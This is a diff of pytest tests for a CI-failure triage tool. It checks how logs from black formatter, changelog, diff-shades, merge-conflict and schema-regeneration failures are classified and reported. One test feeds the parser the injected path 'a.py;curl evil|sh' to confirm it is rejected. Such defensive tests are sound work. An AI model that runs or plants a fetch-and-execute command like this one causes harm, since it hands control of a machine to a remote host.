@@ -576,6 +576,166 @@ def test_a_hook_id_from_the_log_cannot_inject_a_command():
     assert parse.read_log(gh_log("main", lines))["main"]["failures"] == []
 
 
+# psf/black run 36908128198 (#171): black's self-check (`black --check`) on the change's own source.
+FORMAT_LOG = [
+    "would reformat /home/runner/work/black/black/src/black/cache.py",
+    "",
+    "Oh no! 💥 💔 💥",
+    "1 file would be reformatted, 67 files would be left unchanged.",
+    "##[error]Process completed with exit code 1.",
+]
+
+
+def test_a_formatter_check_is_a_lint_failure_with_the_command_to_fix_it(ci, monkeypatch):
+    from tabib import cli
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("lint", FORMAT_LOG))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "lint")
+    assert [(f["framework"], f["file"]) for f in record["failures"]] == [("black", "src/black/cache.py")]
+    text = cli.report(record, "en")
+    assert "black src/black/cache.py" in text and "/itqan:ship" not in text
+
+
+@pytest.mark.parametrize("lines, tool, file", [
+    (["would reformat D:\\a\\black\\black\\scripts\\helper.py", "Oh no! 💥 💔 💥"], "black", "scripts/helper.py"),
+    (["Would reformat: src/app/models.py", "1 file would be reformatted"], "ruff-format", "src/app/models.py"),
+    (["Checking formatting...", "[warn] src/app.tsx",
+      "[warn] Code style issues found in the above file. Run Prettier with --write to fix."], "prettier",
+     "src/app.tsx"),
+])
+def test_formatters_name_the_files(lines, tool, file):
+    found = parse.read_log(gh_log("lint", lines))["lint"]["failures"]
+    assert [(f["framework"], f["kind"], f["file"]) for f in found] == [(tool, "lint", file)]
+
+
+def test_a_formatter_path_cannot_inject_a_command():
+    found = parse.read_log(gh_log("lint", ["would reformat a.py;curl evil|sh", "Oh no!"]))["lint"]["failures"]
+    assert found == []
+
+
+# psf/black run 29266969650 (#172): the changelog check fails with a message the workflow itself prints.
+CHANGELOG_LOG = [
+    '##[group]Run grep -Pz "\\((\\n\\s*)?#5235(\\n\\s*)?\\)" CHANGES.md || \\',
+    'grep -Pz "\\((\\n\\s*)?#5235(\\n\\s*)?\\)" CHANGES.md || \\',
+    "(echo \"Please add '(#5235)' change line to CHANGES.md (or if appropriate, ask a maintainer to add the "
+    "'ci: skip news' label)\" && \\",
+    "exit 1)",
+    "shell: /usr/bin/bash -e {0}",
+    "##[endgroup]",
+    "Please add '(#5235)' change line to CHANGES.md (or if appropriate, ask a maintainer to add the "
+    "'ci: skip news' label)",
+    "##[error]Process completed with exit code 1.",
+]
+# psf/black run 32564540905: diff-shades finds changes in the stable style and the step says so.
+DIFF_SHADES_LOG = [
+    "##[group]Run diff-shades compare --check \\",
+    "diff-shades compare --check \\",
+    "stable-main-acd6198877.json stable-pr-5335-1071b2c21f.json || \\",
+    "(echo \"Please verify you didn't change the stable code style unintentionally!\" \\",
+    "&& exit 1)",
+    "shell: /usr/bin/bash -e {0}",
+    "##[endgroup]",
+    "│ 5 projects & 12 files changed / 178 changes [+109/-69] │",
+    "Differences found.",
+    "Please verify you didn't change the stable code style unintentionally!",
+    "##[error]Process completed with exit code 1.",
+]
+
+
+@pytest.mark.parametrize("lines", [CHANGELOG_LOG, DIFF_SHADES_LOG])
+def test_a_message_the_workflow_prints_is_the_failure(ci, monkeypatch, lines):
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("check", lines))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "check")
+    assert [(f["framework"], f["message"]) for f in record["failures"]] == [("step", lines[-2])]
+    from tabib import cli
+    text = cli.report(record, "en")
+    assert lines[-2] in text and "comes from the workflow" in text and "/itqan:ship" not in text
+
+
+def test_a_check_message_that_passes_after_a_label_is_not_flaky(ci, monkeypatch):
+    """black run 30501014259: the maintainer added 'ci: skip news' and the same commit passed."""
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("check", CHANGELOG_LOG))
+    monkeypatch.setattr(forge, "history", lambda info, run: {"same_commit_passed": 9001, "last_green": None})
+    record = diagnosis.triage(ci)
+    assert record["kind"] == "code"
+    assert any("9001" in e for e in record["evidence"])
+
+
+def test_an_echo_that_is_not_printed_is_not_a_failure():
+    lines = ["##[group]Run make", 'echo "Building the docs"', "make docs", "##[endgroup]",
+             "make: *** [docs] Error 2", "##[error]Process completed with exit code 2."]
+    assert parse.read_log(gh_log("docs", lines))["docs"]["failures"] == []
+
+
+# psf/black run 29181739120 (#173): diff-shades merges the pull request into main first, and it conflicts.
+MERGE_LOG = [
+    "##[group]Run gh pr checkout 5222",
+    "gh pr checkout 5222",
+    "git merge origin/main",
+    "python -m pip install .",
+    "shell: /usr/bin/bash -e {0}",
+    "##[endgroup]",
+    "Switched to branch 'rsb-23/main'",
+    "Auto-merging CHANGES.md",
+    "CONFLICT (content): Merge conflict in CHANGES.md",
+    "Auto-merging src/black/comments.py",
+    "Automatic merge failed; fix conflicts and then commit the result.",
+    "##[error]Process completed with exit code 1.",
+]
+
+
+def test_a_branch_that_does_not_merge_says_rebase(ci, monkeypatch):
+    from tabib import cli
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("analysis / target", MERGE_LOG))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "merge")
+    assert [(f["framework"], f["file"]) for f in record["failures"]] == [("git", "CHANGES.md")]
+    text = cli.report(record, "en")
+    assert "does not merge into main" in text and "rebase" in text and "CHANGES.md" in text
+    assert "/itqan:ship" not in text
+
+
+# psf/black run 35217726081 (#174): the schema is regenerated and `git diff --exit-code` finds it changed.
+GENERATED_LOG = [
+    "##[group]Run tox -e generate_schema",
+    "tox -e generate_schema",
+    "git diff --exit-code",
+    "shell: /usr/bin/bash -e {0}",
+    "env:",
+    "  PIP_UPLOADED_PRIOR_TO: P2D",
+    "##[endgroup]",
+    "  generate_schema: OK (6.24=setup[3.51]+cmd[2.55,0.18] seconds)",
+    "  congratulations :) (6.28 seconds)",
+    "diff --git a/src/black/resources/black.schema.json b/src/black/resources/black.schema.json",
+    "index acf5bb0..465ba0c 100644",
+    "--- a/src/black/resources/black.schema.json",
+    "+++ b/src/black/resources/black.schema.json",
+    "@@ -94,6 +94,7 @@",
+    '           "fmt_off_class_blank_lines",',
+    '+          "parenthesize_whole_conditional_expression",',
+    '           "remove_redundant_generator_parentheses"',
+    "##[error]Process completed with exit code 1.",
+]
+
+
+def test_an_out_of_date_generated_file_names_the_file_and_the_command(ci, monkeypatch):
+    from tabib import cli
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("lint", GENERATED_LOG))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "generated")
+    assert [f["file"] for f in record["failures"]] == ["src/black/resources/black.schema.json"]
+    text = cli.report(record, "en")
+    assert "generated file out of date" in text and "tox -e generate_schema" in text
+    assert "/itqan:ship" not in text
+
+
+def test_a_diff_without_git_diff_exit_code_is_not_a_generated_file():
+    lines = ["##[group]Run ./check.sh", "./check.sh", "##[endgroup]",
+             "diff --git a/x.json b/x.json", "##[error]Process completed with exit code 1."]
+    assert parse.read_log(gh_log("lint", lines))["lint"]["failures"] == []
+
+
 # pallets/flask run 37632508911 (#132): the conftest could not be imported, so pytest ran nothing (exit 4).
 CONFTEST_LOG = [
     "tests-dev: commands[1]> pytest -v --tb=short --basetemp=/home/runner/work/flask/flask/.tox/tmp/tests-dev",
